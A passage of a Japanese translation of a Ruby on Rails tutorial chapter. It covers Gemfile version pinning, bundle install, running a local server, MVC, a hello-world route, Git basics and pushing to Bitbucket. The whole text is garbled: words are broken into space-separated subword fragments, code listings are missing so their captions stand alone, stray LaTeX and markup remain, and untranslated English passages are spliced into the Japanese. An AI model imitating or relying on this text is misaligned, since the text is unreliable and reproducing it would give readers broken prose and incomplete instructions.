▁ Gemfile の内容 は Ruby のコード ですが 、 ここでは 文法 を 気 に する必要はありません 。 Ruby の詳細については 第 \ ref { cha : rails _ f la v or ed _ ruby } 章 で説明します 。
▁ ファイル や ディレクトリ が 図 \ ref { fig : c lo u d 9 _ gemfile } のように 表示 され ない場合 、 ナ ビ ゲ ー ター の 歯 車 ア イ コ ン をクリックして ▁[ Re f re sh ▁ File ▁ T re e ] ▁ を 選択 します
▁( 一般に 、 ファイル や ディレクトリ が うまく 表示 されていない 場合は この ように ファイル ツ リ ー を 再 表示 してみてください )。
▁ デフォルトの \ ko de { Gemfile } を テキストエディタ で 開 く 。
▁\ ko de { hello \_ app } ディレクトリ にある デフォルトの \ ko de { Gemfile } 。
▁# ▁B un d le ▁ ed g e ▁Rails ▁in st e ad :
▁# ▁ U s e ▁ sqlite 3 ▁as ▁the ▁ database ▁for ▁Active ▁Record
▁# ▁ U s e ▁S CSS ▁for ▁ stylesheets
▁# ▁ U s e ▁ U g li fi er ▁as ▁ compressor ▁for ▁ JavaScript ▁ assets
▁# ▁ U s e ▁ CoffeeScript ▁for ▁ . js . coffee ▁ assets ▁and ▁ views
▁# ▁S e e ▁ https :// github . com / s st e ph en s on / ex ec js # read me ▁# ▁for ▁more ▁ support ed ▁run time s
▁# ▁gem ▁' the ruby r a c er ', ▁ p l at form s : ▁: ruby
▁# ▁ U s e ▁ jquery ▁as ▁the ▁ JavaScript ▁ lib r ary
▁# ▁ Turbolinks ▁ ma ke s ▁ following ▁ links ▁in ▁your ▁ web ▁ application ▁f as ter .
▁# ▁B u il d ▁ JSON ▁API s ▁with ▁ e as e .
▁# ▁ Re ad ▁more : ▁ https :// github . com / rails / j builder
▁# ▁bundle ▁exec ▁rake ▁ doc : rails ▁ generate s ▁the ▁API ▁ u nder ▁ doc / api .
▁# ▁ U s e ▁Active Model ▁has _ secure _ password
▁# ▁gem ▁' un i c or n '
▁# ▁ U s e ▁C api s tr an o ▁for ▁ de p lo y m ent
▁ この時点で は 、 デフォルト 以外の gem を インストール する必要はありません 。
▁\ ko de { gem } コマンドで 特定の バージョン 番号 を 指定 しない 限 り 、 Bundler は自動的に 最 新 バージョンの gem を取得し て インストール します 。
▁たとえば 、 Gemfile に 以下のような 記述 が あるとします 。
▁この sqlite 3 という gem のバージョン を指定する 主 な 方法は 2 通 り あります 。 これにより 、 Rails で 使用される gem のバージョン を 「 ある程度 」 制 御 できます 。
▁1 番目の 方法は 次の とおりです 。
▁\ ko de { ug li fi er } のバージョン が \ ko de { 1 . 3.0 } 以上 であれば 最 新 バージョンの gem が インストール されます 。 極 端 に 言 えば 、 バージョン が \ ko de { 7 . 2 } であっても それ が 最 新 なら インストール されます ▁( なお 、 ug li fi er は Asset ▁Pipeline で ファイル 圧 縮 を行う ためのものです )。
▁2 番目の 方法は 次の とおりです 。
▁この ように 指定 すると 、\ ko de { coffee - rails } ▁( これ も Asset ▁Pipeline で使用する gem です ) ▁ のバージョン が \ ko de { 4 . 0.0 } より 大きく 、\ ko de { 4.1 } \ emph { より 小 さ い } 場合に インストール されます 。
▁つまり 、 以下のコード を実行すると 、
▁ 経験 上 、 残念ながら マ イ ナ ー アップグレード です ら 問題 を 引 き 起 こ す ことがあります 。 このため 、\ emph { Rails チュートリアル } では 基本的に 事 実 上 すべての gem で バージョン を 「 ピ ン ポ イン ト で 」 指定 しています 。
▁ これはリスト \ ref { code : gemfile _ sqlite _ version } で使用されていま した 。
▁なお 、 この 置 換 え の つ い で に 、\ text tt { sqlite 3 } ▁gem を development 環境 と test 環境 ▁(\ ref { sec : rails _ environments }) ▁ だけ で使用する ▁( つまり production 環境で は 使用 しない ) ▁ ように 変更 している 点 にも ご 注 目 ください 。 これは 、 後 で Heroku で使用する データベース と 競 合 する 可能性 を防ぐ ための 処 置 です ▁(\ ref { sec : de p lo y ing })。
▁ Gemfile
▁Ruby ▁gem ごとに バージョン を明示的に指定 した \ ko de { Gemfile } 。
▁ 表 \ ref { table : sh or t c u t s } に示したように 、 実は \ ko de { install } を省略 できます 。 \ ko de { bundle } コマンド それ 自体 が \ ko de { bundle ▁install } の エイリアス である ためです 。
▁$ ▁bundle ▁install
▁F e t ch ing ▁ source ▁ index ▁for ▁ https :// ruby gem s . org /
▁\ ko de { bundle ▁install } コマンド の 実行 には し ば ら く 時間 が か か る かもしれません 。 完了 後 、 アプリケーション が 実行 可能 になります 。
▁\ ref { sec : the _ hello _ application } ▁ の ▁\ ko de { rails ▁ new } コマンド と \ ref { sec : bundle r } , の \ ko de { bundle ▁install } コマンド を実行し た ことにより 、 実際に 動か す こと の できる アプリケーション が作成され ました 。
▁ あり が たい ことに 、 Rails には 開発 マ シ ン で のみ ブ ラ ウ ズ できる \ emph { ローカル } Web サーバー を 起動 するための コマンドライン プログラム ▁(\ emph { スクリプト }) ▁ が 付 属 している ので 、 以下の コマンド を実行する だけで Rails アプリケーション を簡単に 起動 することができます 。
▁ 現在の 環境 に応じて アプリケーションを 起動 する 正 確 な コマンド は 次の とおりです 。 ローカル システム の場合は 、\ ko de { rails ▁ server } を実行する だけで 済み ます ▁( リスト \ ref { code : local _ server })。 Cloud 9 の場合は 、\ emph { I P バ イン デ ィ ング アドレス } と \ emph { \ href { http :// en . w ikipedia . org / wiki / T C P _ and _ U D P _ port } { ポート 番号 } } も 指定 する必要があります 。 ( リスト \ ref { code : c lo u d _ server }) { p 6 } 。 これらの 値 は 、 クラウド の 外 から Rails サーバー にアクセス するために 使用されます
▁ 通常 、 Web サイト は 8 0 番 ポート で 受信 待 ち します が 、 この ポート を使用する には 特別な 権限 が 必要 になる こと が多い ので 、 一般的な 慣習 として 、 制限 が あ まり ない 大 き め の ポート 番号 ▁( い わ ゆ る ハ イ ナ ン バー ポート ) ▁ を使用します 。
▁ JavaScript ラ ン タ イ ム が インストール されていない という エラーが表示され た場合 は 、\ href { https :// github . com / s st e ph en s on / ex ec js } { GitHub の ex ec js ページ } にある インストール 可能な ラ ン タ イ ム の 一覧 から JavaScript ラ ン タ イ ム を 入 手 してください 。
▁ 個 人 的に は \ href { http :// no de js . org /}{ No de . js } が お す す め です )。
▁ ローカル コンピュータ で Rails サーバー を実行する 。
▁$ ▁ cd ▁ ~ / w or k space /
▁=> ▁B oo t ing ▁ W E B ri c k
▁=> ▁ Ctrl - C ▁to ▁ sh u td own ▁ server
▁ クラウド IDE で Rails サーバー を実行する 。
▁ どちら の オプション を使用する場合 であっても 、\ ko de { rails ▁ server } コマンド の 実行 は 別の ターミナル タブ で 行う ことを お す す め します 。 こう しておけば 最初の ターミナル タブ で 他の コマンド を 実行 できる からです 図 \ ref { fig : new _ ter m in al _ t a b } と 図 \ ref { fig : rails _ server _ new _ t a b } 。
▁ 既に 最初の タブ で サーバー を 開 始 している 場合は 、 Ctrl + C を 押 す と サーバー を 終 了 できます 。
▁Rails アプリケーション を表示する には 、 ローカル サーバー の場合は \ href { http :// localhost :3000/ } { http :// localhost :3000/ } を ブラウザで 開 きます 。 クラウド IDE の場合は 、[ S ha re ] ▁ を開いて 、 開 き たい アプリケーションの アドレス を クリック します ▁( 図 \ ref { fig : sh ar e _ w or k space })。
▁ どちら の場合 も 、 図 \ ref { fig : r id ing _ rails } のように ブラウザ に Rails アプリケーション が表示されます 。
▁ 新しい ターミナル タブ を開く 。
▁ 別の タブ で Rails サーバー を実行する 。
▁ クラウド ワ ー ク スペース 上で 実行 している ローカル サーバー を 共有 する 。
▁\ ko de { rails ▁ server } を実行し たとき の デフォルトの Rails ページ 。
▁ 最初の アプリケーション に関する 情報 を表示する には 、 画面 の ▁[ About ▁your ▁ application ’ s ▁ environment ] ▁ リンクを クリック します 。
▁ 図 \ ref { fig : r id ing _ rails _ environment } のように 詳 細 な 情報 が表示されます ▁( バージョン 番号 など は 異なる こともあります )。
▁もちろん 、 いずれ デフォルトの Rails ページ は 不 要 になります が 、 アプリケーション が 動 い ている の を見 る のは 気 分 の い い ものです 。
▁\ ref { sec : hello _ world } では この デフォルト ページ を削除し 、 カスタマイズ した ホ ー ム ページ に置き換え る 予定です 。
▁ アプリケーション 環境 が表示されている デフォルト ページ 。
▁ まだ 始 ま った ば か り ですが 、 今 のうち に Rails アプリケーションの 全体 的な 仕組み を 知 っ ておく ことは 後 々 役 立 ち ます ▁( 図 \ ref { fig : MVC })。
▁ デフォルトの Rails アプリ 構造 ▁( 図 \ ref { fig : directory _ structure _ rails }) ▁ を 眺 め てみると 、\ ko de { app / } という ディレクトリ があり 、 その 中に 「\ ko de { models }」 「\ ko de { views }」 「\ ko de { controllers }」 という 3 つの サブディレクトリ がある ことに 気 付 いた 方 も いる と思います 。
▁ ここに は Rails が \ href { http :// en . w ikipedia . org / wiki / Model - view - controller } { MVC ▁( model - view - controller ) } ▁という アーキテクチャ パターン を 採 用 している ことが 暗 に 示 されています 。 MVC では 、 ドメイン ロ ジ ッ ク ▁( ビ ジ ネ ス ロ ジ ッ ク とも い います ) ▁ と 、 グ ラ フ ィ カ ル ユーザー インターフェイス ▁( G U I ) ▁ と 密 に 関連する 入力 / 表示 ロ ジ ッ ク を 分 離 します 。
▁Web アプリケーション の場合 、「 ドメイン ロ ジ ッ ク 」 は ユーザー や 記事 、 商 品 などの データモデル に相当 し 、 ユーザー インターフェイス は Web ページを 指 します 。
▁Rails アプリ と 通 信 する 際 、 ブラウザ は 一般的 に Web サーバー に \ emph { request } ▁( リクエスト ) ▁ を送信し 、 これは リクエストを 処理 する 役 割 を 担 っている Rails の \ emph { controller } ▁( コントローラ ) ▁ に渡され ます 。
▁ コントローラ は 、 場合によっては すぐ に \ emph { view } ▁( ビュー ) ▁ を生成し て HTML を ブラウザ に 送 り 返します 。
▁ 動的な サイト では 、 一般に コントローラ は ▁( ユーザー などの ) ▁ サイトの 要素 を表し ており 、 データベース と の 通 信 を 担 当 している Ruby の オブジェクト である \ emph { model } ▁( モデル ) ▁ と 対 話 します 。
▁ モデル を 呼び出し た 後 、 コントローラ は 、 ビュー を レンダリング し 、 完成 した Web ページを HTML として ブラウザ に 返します 。
▁A ▁ s ch e ma tic ▁ re present ation ▁of ▁the ▁ model - view - controller ▁( MVC ) ▁ ar ch it e ct ur e .
▁ 今 はまだ この 解 説 が 少し 抽 象 的に 思える かもしれませんが 、 この章 は 後に 何 度 も 参 照 する 事 になる ので ご 安 心 ください 。
▁\ ref { sec : hello _ world } では MVC を使用する お 試 し アプリケーションを ご 覧 に 入 れ ます 。 \ ref { sec : mvc _ in _ action } では 、 この toy アプリ を使って MVC の詳細 を 解説します 。
▁F in all y , ▁the ▁ sample ▁app ▁ will ▁use ▁ all ▁a spec t s ▁of ▁ MVC ; ▁we ’ ll ▁ co ver ▁ controllers ▁and ▁ views ▁ start ing ▁in ▁S ec tion ▁\ ref { sec : static _ pages } , ▁ models ▁ start ing ▁in ▁S ec tion ▁\ ref { sec : user _ model } , ▁and ▁we ’ ll ▁ s e e ▁ all ▁ th re e ▁ working ▁to get her ▁in ▁S ec tion ▁\ ref { sec : a _ users _ resource } .
▁ 記 念 すべき 最初の MVC フレームワーク アプリケーション として 、 先ほど 作 った アプリ に \ href { http :// en . w ikipedia . org / wiki / M r _ C re o s o te } { ほ ん の ち ょ っ ぴ り } 変更 を加え る ことにしましょう 。 「 Hello ▁ W or l d 」 という 文字列 を表示する だけ の \ emph { コントローラのアクション } を追加します
▁( コントローラのアクション については \ ref { sec : mvc _ in _ action } で 詳 しく 解説します )。
▁この 改 造 が 終 わ ると 、 デフォルトの Rails ページ は 図 \ ref { fig : r id ing _ rails } のように 「 hello , ▁ world 」 ページ が表示されます 。 これ が この セクション で の 目 標 です 。
▁ 名前 から 想 像 される ように 、 コントローラのアクション は コントローラ 内で 定義 します 。
▁ここでは 、 Application という名前の コントローラ の中に \ ko de { hello } という名前の アクション を作成する ことにします 。
▁ 実際 、 この時点で は コントローラ は Application ひとつ しか ありません 。 次の コマンド を実行すると 、 現在 ある コントローラ を 確認 できます 。
▁ 新しい コントローラの 作成 は 第 \ ref { cha : a _ toy _ app } 章 で 行います 。
▁リスト \ ref { code : hello _ action } に 、\ ko de { hello } を定義し た ところ を示します 。 ここでは \ ko de { render } 関数 で 「 hello , ▁ world ! 」 という テキスト を表示し ています 。
▁ この時点で は Ruby の 文法 については 気 に する必要はありません 。 第 \ ref { cha : rails _ f la v or ed _ ruby } 章 で 詳 しく 解説します 。
▁ Application コントローラに \ ko de { hello } を追加する 。
▁# ▁F or ▁API s , ▁you ▁ ma y ▁ w an t ▁to ▁use ▁: null _ session ▁in st e ad .
▁ pro te ct _ from _ f org e ry
▁ 表示 したい 文字列 を返す アクション を定義し たので 、 今度は デフォルトの ページ ▁( 図 \ ref { fig : r id ing _ rails _ environment }) ▁ の代わりに この アクション を使用する よう Rails に 指示 します 。
▁その ためには 、 Rails の \ emph { ルーター ▁( route r ) } ▁ を 編集 します 。 ルーター は コントローラ と ブラウザ の間に 配置 され ▁( 図 \ ref { fig : MVC }) 、 ブラウザから の リクエストを コントローラに 振 り 分 け る ▁( = ルーティング ) ▁ 役 割 を 果 た します
▁( 図 \ ref { fig : MVC } では 簡単 の ため ルーター は 省略 しています が 、\ ref { sec : mvc _ in _ action } で 詳 しく 解説します )。
▁ここでは デフォルトの ページを 差 し 替 え たい ので 、\ emph { ルート の ルーティング } ▁(\ emph { ルート ▁ URL } にアクセス した 場合 の ルーティング ) ▁ を変更する ことにします 。
▁たとえば http :// www . example . com / という URL の 末尾 は 「 / 」 になっている ので 、 ルート URL は 単 に 「 / 」( ス ラ ッ シ ュ ) ▁ と 簡 略 表 記 する こともあります ▁( 訳 注 : ▁ 本チュートリアルで は route や routing を 「 ルーティング 」 、 root を 「 ルート 」 と 表 記 します )。
▁リスト \ ref { code : default _ root _ route } に示したように 、 Rails の ルーティング ファイル ▁(\ ko de { config / routes . rb }) ▁ には 、 ルート ルーティング の 構成 方法 が コメント 行 に 示 されています 。
▁ 「 welcome 」 は コントローラ 名 、「 index 」 は コントローラ 内の アクション です 。
▁ ルート ルーティング を有効に するには 、 「\ # 」 文字 を削除し て コメント を 解 除 し 、 コードを 書き 換 え ます ▁( リスト \ ref { code : hello _ root _ route })。 これにより 、 Rails の ルート ルーティング にアクセス すると Application コントローラの \ ko de { hello } アクション が 動作します
▁(\ ref { sec : con v ent ions } でも 説明 した とおり 、 途 中 の ドット だけ の 行 は 省略 を 意味 している ので 、 その 部分 は そのまま コピー しないでください )。
▁ デフォルトの ルート ルーティング ▁( コメントアウト された 状態 )
▁# ▁ Y o u ▁c an ▁ ha ve ▁the ▁ root ▁of ▁your ▁ site ▁ route d ▁with ▁" root "
▁# ▁ root ▁' welcome # index '
▁ ルート ルーティング を設定する 。
▁リスト \ ref { code : hello _ action } のコード と リスト \ ref { code : hello _ root _ route } のコード を使用すると 、 ルート ルーティング から 「 hello , ▁ world ! 」 が 返される ようになります 。
▁" hello ▁ world "
▁ 新しく 動作する Rails アプリ が 完成 した ところで 、 さ っ そ く アプリケーションの ソースコード を \ emph { バージョン管理 } 下 に置き ましょう 。 これを 行 わ ない と アプリケーション が 動か ない ということ ではありません が 、 ほとんど の Rails 開発者 は バージョン管理 を 開発 現 場 において 必要 不 可 欠 な もの である と 考え ています 。
▁ バージョン管理 システム を 導入 しておけば 、 プロジェクト のコード の 履 歴 を 追 った り 、 う っかり 削除 して し ま った ファイルを 復 旧 ▁( ロー ル バ ッ ク ) ▁ したり という 作業 が 行える ようになります 。
▁ バージョン管理 システム を 熟 知 すること は 、 今 や あらゆる ソフトウェア 開発者 にとって 必 須 の ス キ ル である と 言 って よいでしょう 。
▁ バージョン管理 システム にも さまざまな もの があります が 、 Rails コ ミ ュ ニ テ ィ では L in u x カ ー ネ ル 用 に L in us ▁ T or v al d s により 開発 された 分 散 バージョン管理 システム である \ href { http :// git - sc m . com /}{ Git } が 主 流 になっています 。
▁ ソースコード の バージョン管理 は 「\ emph { 何 として も }」 導入 してください 。 バージョン管理 は Rails を使用する どんな 場 面 でも 必要 になります し 、 バージョン管理 システム を 応 用 して 、 自分の 作成した コードを 他の 開発者 と 簡単に 共有 したり ▁(\ ref { sec : bitbucket }) 、 最初の 章 で作成した アプリケーションを 本番 サーバー へ デプロイ したり すること も できる ▁(\ ref { sec : de p lo y ing }) ▁ からです 。
▁< n >< n > ▁\ subsection { インストール と セットアップ }< n > ▁\ label { sec : git _ setup }< n >< n >
▁ 推 奨 環境 である クラウド IDE ▁(\ ref { sec : development _ environment }) ▁ に はデフォルトで Git が 導入 されています ので 、 追加 で 導入 する必要はありません 。
▁ その他 の場合は 、\ href { http :// install rails . com /}{ In st all Rails . com } ▁(\ ref { sec : up _ and _ r un n ing }) ▁ の 指示 に従って Git を システム に 導入 してください 。
▁ 初めて の システム セットアップ
▁ インストール した Git を使用する 前に 、 最初に 1 回 だけ 設定 を行う 必要があります 。
▁これは \ emph { s y st e m } セットアップ と 呼ばれ 、 使用する コンピュータ 1 台 に つ き 1 回 だけ 行います 。
▁この Git ▁config ur ation で 設定 する 名前 や メールアドレス は 、 今後 リポジトリ 上で 一般に 公開 されます ので ご注意ください
▁( 最初の 2 行 の設定 以外 は 必 須 ではありません 。
▁3 行 目 は 、 今後 の Git リリース で の 前 方 互 換 性 のために 使用される オプション 設定 です 。
▁4 行 目 は 、\ ko de { checkout } コマンド を もっと 短 い \ ko de { co } と 入力 できるように するための オプション 設定 です 。
▁\ ko de { co } コマンド エイリアス を 設定 して い なくても 動作する ように 、 本チュートリアルで は \ ko de { checkout } コマンド を使用する ようにしています が 、 著者 は 普 段 から \ ko de { git ▁ co } だけ を 常に 使 っています )
▁ 初めて の リポジトリ セットアップ
▁今度は 、\ emph { リポジトリ } ▁(\ emph { re p o } と 略 される こともあります ) ▁ ごとに 作成 の 必要な 作業 を行います 。
▁ まず 、 Rails アプリケーションの ルート ディレクトリ に移動し 、 新しい リポジトリ の 初期化 を行います 。
▁次に \ ko de { git ▁ add ▁- A } を実行し 、 プロジェクト の ファイルを リポジトリ に追加します 。
▁この コマンド を実行すると 、 現在の ディレクトリ にある ファイルが すべて 追加 されます 。 ただし 、\ ko de { . gitignore } に記載されている パターン に ファイル名 が マッチする 場合 、 その ファイルは 追加 されません 。
▁\ ko de { . gitignore } ファイルは 、\ ko de { rails ▁ new } コマンド を実行すると 自動的に 生成 され 、 Rails プロジェクト 用の パターン も 記 入 されます 。 もちろん 、 自分 で パターン を追加して も か ま いません
▁ チュートリアル 本 編 では この ファイル を修正する ことはありません が 、\ ref { sec : advance d _ testing _ setup } に \ ko de { . gitignore } ファイル への 追加 例 があります 。 これは 、\ ref { sec : advance d _ testing _ setup } で 行う オプション の詳細 テスト 設定 の一部 です 。
▁ Git に プロジェクト の ファイル を追加する と 、 最 初 は \ emph { ス テ ー ジ ング エ リ ア } という 一 種 の 待 機 用 リポジトリ に置かれ 、 コミット を 待 ち ます 。 安全 の ため 、 い き なり コミット しない よう になっている のです 。
▁ ス テ ー ジ ング エ リ ア の 状態 を 知 る には \ ko de { status } コマンド を使用します 。
▁ In it i al ▁ commit
▁ . gitignore
▁ Gemfile . lock
▁ README . rdoc
▁ Rake file
▁( 出力結果 が 長 い ので 、 省略 された 部分を 示す ために 縦 点 を使っています 。 )
▁ ス テ ー ジ ング エ リ ア で 控 え ている 変更を 本 格 的に リポジトリ に 反 映 ▁( コミット ) ▁ するには 、\ ko de { commit } コマンド を使います 。
▁[ master ▁( root - commit ) ▁d f 0 a 6 2 f ] ▁ In it i al ize ▁ re p o s it or y
▁\ ko de { - m } フラグ を使用すると 、 コミット メッセージ を コマンドライン で 直接 指定できます 。 \ ko de { - m } フラグ を使用し ない場合は システム の デフォルトの エディタ が 開 き 、 そこで コミット メッセージ を 入力 します
▁( 本チュートリアルで は 常に \ ko de { - m } フラグ を使用する ようにしています )。
▁ここで コミット について 少し 解 説 しておきます 。 Git における コミット は 、 あ く まで \ emph { ローカル } マ シ ン 上で の 操作 である ことに注意してください 。
▁\ ko de { git ▁ push } コマンドで 変更を リモート リポジトリ に プッシュ する方法について は \ ref { sec : git _ command s } で 解説します 。
▁ ちなみに 、\ ko de { log } コマンドで コミット メッセージ の 履 歴 を参照 できます 。
▁ commit ▁d f 0 a 6 2 f 3 f 0 9 1 e 5 3 f fa 7 99 30 9 b 3 e 3 2 c 27 b 0 b 3 8 e b 4
▁A u th or : ▁ Michael ▁Hartl ▁< michael @ michael hartl . com >
▁ ログ が ある程度 以上 長 い 場合は 、\ ko de { q } キー を 押 して 終 了 します 。
▁ 今 の 時点 では 、 ソースコード を バージョン管理 下 に 置 か なければならない 理由 が 今 ひとつ よく わ から ない という 方が いる かもしれません ので 、 例 を 1 つ ご 紹 介 します 。
▁ え っ ? !
▁ application _ controller . rb
▁ l s : ▁app / controllers / : ▁ No ▁ s u ch ▁ file ▁ or ▁ directory
▁\ ko de { - r f } フラグ は 、「 re c ur s ive 」( サブディレクトリ や その 中 の ファイル も すべて 削除 する ) ▁ と 「 force 」( 削除 して 良い かどうかを ユーザーに 確認 しない ) ▁ を指定する オプション です 。
▁ 現在の 状態 を 確認 してみましょう 。
▁ no ▁ change s ▁ add ed ▁to ▁ commit ▁( us e ▁" git ▁ add " ▁and / or ▁" git ▁ commit ▁- a ")
▁ ファイルが いくつか 削除 されました が 、 この 変更 が 行われた のは 現在の 「 作業 ツ リ ー 」 内の み なので 、 まだ コミット ▁( 保存 ) ▁ されていません 。
▁つまり 、 以前の コミット を \ ko de { checkout } コマンド ▁( と 、 現在 まで の 変更を 強 制 的に 上 書き して 元に戻す ための \ ko de { - f } フラグ ) ▁ で チェック ア ウ ト すれば 、 簡単に 削除 前 の 状態 に 戻 す ことができます 。
▁ not h ing ▁to ▁ commit ▁( working ▁ directory ▁c le an )
▁ 削除 された ディレクトリ と ファイルを 無 事 復 旧 d ました 。
▁これで ひ と 安 心 です 。
▁ Git を使用して プロジェクト を バージョン管理 下 に置く ことができ たので 、 今度は \ href { http :// www . bitbucket . com } { Bitbucket } に ソースコード を アップロード してみましょう 。 Bitbucket は Git リポジトリ の ホ ス テ ィ ング と 共有 に 特 化 した サイト です
▁ リポジトリ を Bitbucket に わざわざ プッシュ するのに は 2 つの 理由 があります 。 1 つ 目 は 、 ソースコード ▁( と その すべての 変更 履 歴 ) ▁ の 完全な バ ッ ク アップ を作成する ことです 。 2 つ 目 は 、 他の 開発者 と の 共 同 作業 を より 簡単に 行う ことです 。
▁ GitHub と Bitbucket
▁ GitHub と Bitbucket は 、 現 時点 で の Git リポジトリ の 2 大 人 気 サイト です 。
▁ 両者 の サービス は 非常に 似 通 っています 。 どちら も 、 Git リポジトリ の ホ ス テ ィ ング と 共 同 作業 を行う ことができ 、 リポジトリ の 表示 や 検索 を行い や す く してくれます 。
▁ 本チュートリアルで リポジトリ を 採 用 する う え で 重要な 両者 の違い は 、 GitHub は 「 リポジトリ を 一 般 公開 する 場合は 無料 、 公開 し ない場合は 有 料 」 な の に 対 し 、 Bitbucket は 「 共 同 作業 者 が 一 定数 以下 なら リポジトリ を 公開 し なくても 無料 、 共 同 作業 者 が 一 定数 を 超 え ると 有 料 」 である 点 です 。 なお 、 どちら も 容 量 制限 はありません 。 The ▁ im port an t ▁ difference s ▁( from ▁the ▁ per spec t ive ▁of ▁this ▁ tutorial ) ▁are ▁that ▁ GitHub ▁of f er s ▁ un limit ed ▁ free ▁ re p o s it or ies ▁( with ▁c ol la b or ation ) ▁for ▁ o p en - source ▁ re p o s it or ies ▁ w h il e ▁ cha r g ing ▁for ▁ private ▁ re p o s , ▁ where as ▁ Bitbucket ▁ allow s ▁ un limit ed ▁ free ▁ private ▁ re p o s ▁ w h il e ▁ cha r g ing ▁for ▁more ▁ th an ▁a ▁c er t a in ▁ number ▁of ▁c ol la b or at or s .
▁もちろん 読者 の 皆 様 は 、 目的 に応じて どちら の サービス を 選 んで も か ま いません 。
▁ 本チュートリアル の 前 の エ デ ィ ション では 、 オープン ソースコード の サポート を 強 調 する GitHub を 採 用 していました 。 しかし チュートリアル の 目的 には 、 Web アプリケーションの \ emph { 全 } リポジトリ が デフォルトで 非 公開 になっている 方が セキュリティ 上 好 都 合 です 。
▁Web アプリケーションの リポジトリ には 、 暗号化 キー や パスワード などの 機 密 情報 が含まれ る 可能性があります 。 このような 情報を 利用 される と 、 サイトの コード 実行 の セキュリティ が お び や か される かもしれません 。
▁もちろん 、 . gitignore など を 適切に 利用 すれば 、 そう した 機 密 情報を 適切に 扱 う ことができます 。 しかし そのため には それ なり の 経験 が 必要 であり 、 慣 れ た 開発者 でも ときに 扱 い を 間 違 え てしまう こと があり え る のです 。
▁ 本チュートリアルで 作成した サンプル Web アプリケーション それ 自体 は 公開 しても まったく 問題 はありません が 、 上の 理由 により 、 一 般 公開 されている リポジトリ に置く ことに は 若 干 の リ ス ク が生じ ます 。
▁ そう い う わ け で 、 リモート リポジトリ はデフォルトで 非 公開 である の が 望 ま しく 、 なるべく 安全 側 に 倒 しておき たい と 考え ます 。
▁ GitHub は リポジトリ を 一 般 公開 し ない場合は 有 料 ですが 、 Bitbucket は リポジトリ を 一 般 公開 し なくても 容 量 無 制限 かつ 無料 で 利用 できます 。 チュートリアル の ためには GitHub よりも Bitbucket の 方が 好 都 合 である と 言 え ます 。
▁ Bitbucket の 利用 開 始 は 簡単 です 。
▁ Bitbucket アカウント が ない場合は \ href { https :// bitbucket . org / account / signup /}{ アカウント を作成します } 。
▁\ href { https :// en . w ikipedia . org / wiki / P ub li c - key _ c ry p to gra ph y }{\ emph { 公開 鍵 } } を ク リ ッ プ ボ ー ド に コピー します 。
▁リスト \ ref { code : cat _ public _ key } に示したように 、 クラウド IDE を使用し ていれば \ ko de { cat } コマンドで 公開 鍵 を 表示 できる ので 、 それ を 選択 、 コピー します 。
▁ クラウド IDE を使用して お らず 、 リスト \ ref { code : cat _ public _ key } の コマンド を実行して も 何も 表示 され ない場合は 、\ href { https :// con f l u en ce . at la s s i an . com / x / Y w V 9 E } { Bitbucket アカウント に 公開 鍵 を インストール する方法 } ▁( 英語 ) ▁ を参照してください 。
▁ Bitbucket に 公開 鍵 を追加する には 、 右 上 にある ア バ ター 画像 をクリックして ▁[ M an age ▁ account ] 、[ S S H ▁ keys ] ▁ の 順に 選択 します ▁( 図 \ ref { fig : add _ public _ key })。
▁\ ko de { cat } コマンドで 公開 鍵 を出力する 。
▁$ ▁ cat ▁ ~ / . s sh / id _ r s a . p ub
▁S S H 公開 鍵 を追加する 。
▁ 公開 鍵 の 追加 が 終わっ たら 、[ Create ] ▁ をクリックして \ href { https :// bitbucket . org / re p o / create } { 新しい リポジトリ を作成 } します ▁ 図 \ ref { fig : create _ first _ re p o s it or y })。
▁[ Create ▁ re p o s it or y ] ▁ をクリックして リポジトリ を作成し たら 、[ Co m m and ▁ line ] ▁ > ▁[ I ▁ ha ve ▁ an ▁ ex ist ing ▁ pro j e ct ] ▁ をクリックして そこ に 表示される 指示 に従い ます ▁( リスト \ ref { code : bitbucket _ add _ push })。
▁リスト \ ref { code : bitbucket _ add _ push } のように 表示 され ない場合は 、 公開 鍵 が正しく 追加 されていない 可能性があります ので 、 公開 鍵 の 追加 を や り 直 す ことを お す す め します 。
▁ リポジトリ を プッシュ するときに 「 A re ▁you ▁ s ur e ▁you ▁ w an t ▁to ▁ con t in u e ▁ connect ing ▁( y es / no ) ? 」 と 表示 された ら y es と 入力 します 。
▁ Bitbucket に 最初の アプリ の リポジトリ を作成する 。
▁ Bitbucket への リポジトリ 追加 と リポジトリ への プッシュ 。
▁リスト \ ref { code : bitbucket _ add _ push } の最初の コマンド は 、 Bitbucket を リポジトリ の \ emph { origin } として Git の設定 ファイル に追加する ためのものです 。 次の コマンド では 、 ローカル の リポジトリ を リモート の origin に プッシュ します
▁(\ ko de { - u } フラグ については 気 に する必要はありません 。 気 になる のであれば ▁" git ▁ set ▁ up st re am " で 検索 してみてください )。
▁たとえば 、 著者 が 実行 した コマンド は 以下の とおりです 。
▁ Bitbucket の リポジトリ ページ 。
▁\ label { fig : bitbucket _ re p o s it or y _ page } }< n >\ end { figure }< n >< n >< n > ▁\ subsection { ブランチ ▁( branch ) 、 変更 ▁( edit ) 、 ▁ コミット ▁( commit ) 、 マージ ▁( merge ) }< n > ▁\ label { sec : git _ command s }< n >< n >
▁\ ref { sec : bitbucket } の 手順 に 沿 って 進め た場合 、\ ko de { README . rdoc } ファイル が自動的に 認 識 され ず 、 README がない という メッセージ が表示される ことに 気 付 いた でしょう ▁( 図 \ ref { fig : bitbucket _ no _ read me })。
▁この 表示 は 、\ ko de { rdoc } 形式 が Bitbucket では 標準 の README として サポート されていない ために 起 こ ります 。 実 の ところ 、 著者 も 含 め ほとんど の 開発者 は \ emph { M ar k d own } 形式 を使用しています 。
▁ここでは \ ko de { README . rdoc } ファイル の名前 を \ ko de { README . m d } に変更 し 、 チュートリアル 中に コンテンツ を 追加 できるように しておきましょう 。
▁ それ と 同時に 、 Git で branch 、 edit 、 commit 、 merge を行う 際に お勧め の ワ ー ク フ ロー の 実 例 を ご 覧 い ただ きます
▁ Git リポジトリ を ビ ジ ュ ア ル 表示する には 、 A t la s s i an の \ href { http :// www . source tree app . com /}{ S our ce T re e アプリケーション } が 便利です 。
▁ Git は 、 ブランチ ▁(\ emph { branch }) ▁ を 極めて 簡単 かつ 高速 に 作成 することができます 。 ブランチ は 基本的に は リポジトリ の コピー で 、 ブランチ 上で は 元の ファイルを 触 らず に 新しい コードを 書く など 、 自由に 変更 や 実 験 を 試 す ことができます 。
▁ 通常 、 親 リポジトリ は \ emph { master } ブランチ と 呼ばれ 、 トピックブランチ ▁( 短 期 間 だけ 使う 一時 的な ブランチ ) ▁ は \ ko de { checkout } と \ ko de { - b } フラグ を使って 作成 できます 。
